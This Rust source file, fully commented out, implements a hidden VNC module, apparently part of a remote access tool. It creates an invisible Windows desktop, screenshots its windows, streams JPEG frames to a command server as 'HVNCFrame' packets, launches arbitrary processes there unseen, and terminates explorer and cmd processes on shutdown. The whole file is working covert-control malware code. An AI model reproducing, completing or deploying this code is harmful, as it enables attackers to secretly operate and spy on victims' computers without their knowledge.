// use std::sync::atomic::{AtomicBool, Ordering};
// use std::sync::Arc;
// use std::thread;
// use std::time::Duration;
// use std::sync::Mutex;

// use screenshots::image;
// use std::io::Cursor;

// use common::packets::ServerboundPacket;
// use crate::handler::send_packet;

// use winapi::um::winuser::{
//     CreateDesktopA,
//     OpenDesktopA,
//     CloseDesktop,
//     SetThreadDesktop,
//     GetDesktopWindow,
//     GetDC,
//     ReleaseDC,
//     GetWindowRect,
//     PrintWindow,
//     GetTopWindow,
//     GetWindow,
//     IsWindowVisible,
//     GW_HWNDLAST,
//     GW_HWNDPREV,
//     DESKTOP_CREATEWINDOW,
//     DESKTOP_WRITEOBJECTS,
//     DESKTOP_READOBJECTS,
//     DESKTOP_SWITCHDESKTOP,
//     DESKTOP_ENUMERATE,
//     EnumDesktopWindows,
//     GetWindowThreadProcessId
// };
// use winapi::um::wingdi::{
//     CreateCompatibleDC,
//     CreateCompatibleBitmap,
//     SelectObject,
//     DeleteObject,
//     DeleteDC,
//     GetDeviceCaps,
//     GetDIBits,
//     BITMAPINFO, 
//     BITMAPINFOHEADER, 
//     BI_RGB, 
//     DIB_RGB_COLORS,
//     HORZRES,
//     VERTRES
// };
// use winapi::shared::windef::{HWND, HDC, RECT, HBITMAP, HGDIOBJ};
// use winapi::shared::minwindef::{BOOL, DWORD, TRUE, FALSE};
// use std::ffi::CString;
// use std::mem::zeroed;
// use std::ptr::null_mut;
// use winapi::um::processthreadsapi::{STARTUPINFOA, CreateProcessA, PROCESS_INFORMATION};
// use winapi::um::winnt::GENERIC_ALL;

// static ACCESS_FLAGS: DWORD = DESKTOP_CREATEWINDOW | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP |DESKTOP_ENUMERATE | GENERIC_ALL;

// static HVNC_ACTIVE: Mutex<Option<Arc<AtomicBool>>> = Mutex::new(None);
// static DESKTOP_NAME: Mutex<&str> = Mutex::new("Desktopx2");

// pub fn start_hvnc() {
//     stop_hvnc();

//     let stop_flag = Arc::new(AtomicBool::new(false));
    
//     let mut active = HVNC_ACTIVE.lock().unwrap();
//     *active = Some(Arc::clone(&stop_flag));
    
//     let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
    
//     thread::spawn(move || {
//         let rt = tokio::runtime::Builder::new_current_thread()
//             .enable_all()
//             .build()
//             .expect("Failed to create Tokio runtime");
            
//         let stop_flag = HVNC_ACTIVE.lock().unwrap().as_ref().unwrap().clone();
        
//         let hvnc_desktop = unsafe {
//             // Convert desktop name to CString for the API call
//             let desktop_name_cstr = match CString::new(desktop_name) {
//                 Ok(cstr) => cstr,
//                 Err(_) => {
//                     return;
//                 }
//             };
            
//             // Try to open existing desktop first
//             let desktop_handle = OpenDesktopA(
//                 desktop_name_cstr.as_ptr() as *const i8,
//                 0,
//                 FALSE,
//                 ACCESS_FLAGS
//             );
            
//             // If it doesn't exist, create a new one
//             let desktop_handle = if desktop_handle.is_null() {
//                 let new_handle = CreateDesktopA(
//                     desktop_name_cstr.as_ptr() as *const i8,
//                     null_mut(),
//                     null_mut(),
//                     0,
//                     ACCESS_FLAGS,
//                     null_mut()
//                 );
                
//                 new_handle
//             } else {
//                 desktop_handle
//             };
            
//             desktop_handle
//         };
        
//         if hvnc_desktop.is_null() {
//             return;
//         }
        
//         let desktop_set = unsafe {
//             SetThreadDesktop(hvnc_desktop) != 0
//         };
        
//         if !desktop_set {
//             unsafe { CloseDesktop(hvnc_desktop) };
//             return;
//         }
        
        
//         // Stream frames as long as active
//         while !stop_flag.load(Ordering::Relaxed) {
//             // Get desktop dimensions
//             let (width, height) = unsafe {
//                 let dc = GetDC(null_mut());
//                 let w = GetDeviceCaps(dc, HORZRES);
//                 let h = GetDeviceCaps(dc, VERTRES);
//                 ReleaseDC(null_mut(), dc);
//                 (w, h)
//             };
            
//             let mut frame_data = Vec::new();
            
//             unsafe {
//                 // Capture desktop image
//                 let dc = GetDC(null_mut());
//                 if !dc.is_null() {
//                     let mem_dc = CreateCompatibleDC(dc);
//                     if !mem_dc.is_null() {
//                         let bitmap = CreateCompatibleBitmap(dc, width, height);
//                         if !bitmap.is_null() {
//                             let old_obj = SelectObject(mem_dc, bitmap as HGDIOBJ);
                            
//                             // Capture visible windows
//                             let _ = capture_windows(mem_dc);
                            
//                             // Convert to image and compress
//                             let raw_data = extract_bitmap_data(bitmap, width, height);
                            
//                             if let Some(img) = image::RgbaImage::from_raw(
//                                 width as u32, 
//                                 height as u32, 
//                                 raw_data
//                             ) {
//                                 let dynamic_img = image::DynamicImage::ImageRgba8(img);
                                
//                                 // Compress to JPEG and send
//                                 if dynamic_img.write_to(
//                                     &mut Cursor::new(&mut frame_data),
//                                     image::ImageOutputFormat::Jpeg(70), // 70% quality
//                                 ).is_ok() {
//                                     // Only send if we have data
//                                     if !frame_data.is_empty() {
//                                         // Send frame
//                                         let packet = ServerboundPacket::HVNCFrame(frame_data);
                                        
//                                         if let Err(_e) = rt.block_on(send_packet(packet)) {
//                                         }
//                                     }
//                                 }
//                             }
                            
//                             // Clean up
//                             SelectObject(mem_dc, old_obj);
//                             DeleteObject(bitmap as HGDIOBJ);
//                         }
//                         DeleteDC(mem_dc);
//                     }
//                     ReleaseDC(null_mut(), dc);
//                 }
//             }
            
//             // Sleep to control frame rate (about 5 FPS)
//             thread::sleep(Duration::from_millis(200));
//         }
        
//         // Cleanup desktop
//         unsafe {
//             if !hvnc_desktop.is_null() {
//                 CloseDesktop(hvnc_desktop);
//             }
//         }
//     });
// }

// pub fn stop_hvnc() {
//     // Set the stop flag to stop the streaming thread
//     let mut active = HVNC_ACTIVE.lock().unwrap();
//     if let Some(flag) = active.as_ref() {
//         flag.store(true, Ordering::Relaxed);
//         *active = None;
//     }
    
//     // Get the desktop name
//     let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
    
//     // Spawn a thread to properly clean up the desktop
//     thread::spawn(move || {
//         // Give a moment for the streaming thread to stop
//         thread::sleep(Duration::from_millis(500));
        
//         unsafe {
//             // Find all processes on the HVNC desktop and terminate them
//             kill_all_processes_on_desktop(&desktop_name);
            
//             // Try to open the desktop to close it
//             if let Ok(desktop_cstr) = CString::new(desktop_name) {
//                 let desktop_handle = OpenDesktopA(
//                     desktop_cstr.as_ptr() as *const i8,
//                     0,
//                     FALSE,
//                     DESKTOP_READOBJECTS | DESKTOP_ENUMERATE
//                 );
                
//                 if !desktop_handle.is_null() {
//                     CloseDesktop(desktop_handle);
//                 }
//             }
            
//             // Attempt to close/switch from the desktop to ensure it's not in use
//             if let Ok(workstation_name) = CString::new("WinSta0\\Default") {
//                 let default_desktop = OpenDesktopA(
//                     workstation_name.as_ptr() as *const i8, 
//                     0, 
//                     FALSE, 
//                     DESKTOP_SWITCHDESKTOP
//                 );
                
//                 if !default_desktop.is_null() {
//                     // Switch to default desktop to ensure resources are freed
//                     SetThreadDesktop(default_desktop);
//                     CloseDesktop(default_desktop);
//                 }
//             }
//         }
//     });
// }

// unsafe fn kill_all_processes_on_desktop(desktop_name: &str) {
//     use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
//     use winapi::um::handleapi::CloseHandle;
//     use winapi::um::winnt::PROCESS_TERMINATE;
//     use winapi::shared::minwindef::DWORD;
    
//     #[allow(non_snake_case)]
//     extern "system" {
//         fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE;
//         fn Process32FirstW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
//         fn Process32NextW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
//     }
    
//     type HANDLE = *mut winapi::ctypes::c_void;
    
//     #[repr(C)]
//     struct PROCESSENTRY32W {
//         dwSize: DWORD,
//         cntUsage: DWORD,
//         th32ProcessID: DWORD,
//         th32DefaultHeapID: usize,
//         th32ModuleID: DWORD,
//         cntThreads: DWORD,
//         th32ParentProcessID: DWORD,
//         pcPriClassBase: i32,
//         dwFlags: DWORD,
//         szExeFile: [u16; 260],
//     }
    
//     const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
        
//     let mut hvnc_desktop_pids: Vec<DWORD> = Vec::new();
    
//     if let Ok(desktop_cstr) = CString::new(desktop_name) {
//         let desktop_handle = OpenDesktopA(
//             desktop_cstr.as_ptr() as *const i8,
//             0,
//             FALSE,
//             DESKTOP_READOBJECTS | DESKTOP_ENUMERATE
//         );
        
//         if !desktop_handle.is_null() {
//             extern "system" fn enum_windows_callback(hwnd: HWND, lparam: isize) -> BOOL {
//                 unsafe {
//                     let pid_vec = &mut *(lparam as *mut Vec<DWORD>);
//                     let mut process_id: DWORD = 0;
                    
//                     GetWindowThreadProcessId(hwnd, &mut process_id);
                    
//                     if process_id != 0 && !pid_vec.contains(&process_id) {
//                         pid_vec.push(process_id);
//                     }
//                 }
//                 TRUE
//             }
            
//             let _result = EnumDesktopWindows(
//                 desktop_handle,
//                 Some(enum_windows_callback),
//                 &mut hvnc_desktop_pids as *mut Vec<DWORD> as isize
//             );
            
//             CloseDesktop(desktop_handle);
//         }
//     }
        
//     if hvnc_desktop_pids.is_empty() {
//         return;
//     }
    
//     let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//     if snapshot.is_null() {
//         return;
//     }
    
//     let mut pe32: PROCESSENTRY32W = std::mem::zeroed();
//     pe32.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
    
//     if Process32FirstW(snapshot, &mut pe32) != 0 {
//         loop {
//             let name = String::from_utf16_lossy(
//                 &pe32.szExeFile[..pe32.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe32.szExeFile.len())]
//             );
            
//             if name.to_lowercase().contains("explorer") || name.to_lowercase().contains("cmd") {
//                 if hvnc_desktop_pids.contains(&pe32.th32ProcessID) {
//                     if pe32.th32ProcessID != winapi::um::processthreadsapi::GetCurrentProcessId() {
//                         let process = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
//                         if !process.is_null() {
//                             TerminateProcess(process, 0);
//                             CloseHandle(process);
//                         }
//                     }
//                 }
//             }
            
//             if Process32NextW(snapshot, &mut pe32) == 0 {
//                 break;
//             }
//         }
//     }
    
//     CloseHandle(snapshot);
// }

// pub fn open_process(process_name: &str) {
//     let desktop_name = DESKTOP_NAME.lock().unwrap().clone();
//     let process_name = process_name.to_string();
    
//     thread::spawn(move || {
//         unsafe {
//             let desktop_cstr = match CString::new(desktop_name) {
//                 Ok(cstr) => cstr,
//                 Err(_) => {
//                     return;
//                 }
//             };
            
//             let hvnc_desktop = OpenDesktopA(
//                 desktop_cstr.as_ptr() as *const i8,
//                 0,
//                 FALSE,
//                 ACCESS_FLAGS
//             );
            
//             if hvnc_desktop.is_null() {
//                 return;
//             }
            
//             if SetThreadDesktop(hvnc_desktop) == 0 {
//                 CloseDesktop(hvnc_desktop);
//                 return;
//             }
            
//             let desktop_path = format!("WinSta0\\{}", desktop_name);
//             let desktop_path_cstr = CString::new(desktop_path.clone()).unwrap();
            
//             let command = CString::new(process_name).unwrap();
            
//             let cmd_len = command.as_bytes_with_nul().len();
//             let mut cmd_buf = vec![0i8; cmd_len];
//             for (i, &byte) in command.as_bytes_with_nul().iter().enumerate() {
//                 cmd_buf[i] = byte as i8;
//             }
            
//             let mut si: STARTUPINFOA = zeroed();
//             si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
//             si.lpDesktop = desktop_path_cstr.as_ptr() as *mut i8;
//             si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
//             si.wShowWindow = 5;      // SW_SHOW
            
//             let mut pi: PROCESS_INFORMATION = zeroed();
            
//             let result = CreateProcessA(
//                 null_mut(),              // No application name (use command line)
//                 cmd_buf.as_mut_ptr(),    // Command line
//                 null_mut(),              // Process security attributes
//                 null_mut(),              // Thread security attributes
//                 FALSE,                   // Don't inherit handles
//                 0x00000010,              // CREATE_NEW_CONSOLE
//                 null_mut(),              // Use parent's environment
//                 null_mut(),              // Use parent's current directory
//                 &mut si,                 // Startup info with desktop name
//                 &mut pi                  // Process information
//             );
            
//             if result != 0 {
//                 winapi::um::handleapi::CloseHandle(pi.hProcess);
//                 winapi::um::handleapi::CloseHandle(pi.hThread);
//             }
            
//             CloseDesktop(hvnc_desktop);
//         }
//     });
// }

// unsafe fn capture_windows(mem_dc: HDC) -> bool {
//     let desktop_wnd = GetDesktopWindow();
//     if desktop_wnd.is_null() {
//         return false;
//     }
    
//     let mut desktop_rect: RECT = zeroed();
//     if GetWindowRect(desktop_wnd, &mut desktop_rect) == 0 {
//         return false;
//     }
    
//     let mut hwnd = GetTopWindow(null_mut());
//     if hwnd.is_null() {
//         return false;
//     }
    
//     hwnd = GetWindow(hwnd, GW_HWNDLAST);
//     if hwnd.is_null() {
//         return false;
//     }
    
//     while !hwnd.is_null() {
//         if IsWindowVisible(hwnd) != 0 {
//             let mut rect: RECT = zeroed();
//             if GetWindowRect(hwnd, &mut rect) != 0 {
//                 PrintWindow(hwnd, mem_dc, 2);
//             }
//         }
        
//         hwnd = GetWindow(hwnd, GW_HWNDPREV);
//     }
    
//     true
// }

// unsafe fn extract_bitmap_data(bitmap: HBITMAP, width: i32, height: i32) -> Vec<u8> {
//     let mut buffer = vec![0u8; (width * height * 4) as usize];
    
//     let dc = GetDC(null_mut());
//     if dc.is_null() {
//         return buffer; // Return empty buffer on failure
//     }

//     let mut bi = BITMAPINFO {
//         bmiHeader: BITMAPINFOHEADER {
//             biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
//             biWidth: width,
//             biHeight: -height, // Negative for top-down
//             biPlanes: 1,
//             biBitCount: 32,    // 32-bit RGBA
//             biCompression: BI_RGB,
//             biSizeImage: 0,
//             biXPelsPerMeter: 0,
//             biYPelsPerMeter: 0,
//             biClrUsed: 0,
//             biClrImportant: 0,
//         },
//         bmiColors: [std::mem::zeroed()],
//     };
    
//     let _result = GetDIBits(
//         dc, 
//         bitmap, 
//         0, 
//         height as u32, 
//         buffer.as_mut_ptr() as *mut winapi::ctypes::c_void, 
//         &mut bi, 
//         DIB_RGB_COLORS
//     );
    
//     ReleaseDC(null_mut(), dc);

//     buffer
// }